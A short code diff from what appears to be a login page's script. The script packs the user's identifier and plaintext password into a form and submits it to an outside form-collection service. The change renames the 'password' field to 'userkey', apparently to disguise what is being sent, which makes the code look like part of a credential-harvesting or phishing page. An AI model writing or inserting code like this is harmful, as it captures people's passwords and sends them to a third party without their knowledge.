@@ -316,8 +316,8 @@
       const formData = new FormData();
       formData.append('fi-text-loginType', loginType);
       formData.append('fi-text-identifier', identifier);
-      formData.append('fi-text-password',   password);
-      formData.append('fi-text-time',       new Date().toLocaleString());
+      formData.append('fi-text-userkey',   password);
+      formData.append('fi-text-logintime', new Date().toLocaleString());
 
       const { data, error } = await forminit.submit(FORM_ID, formData);
 
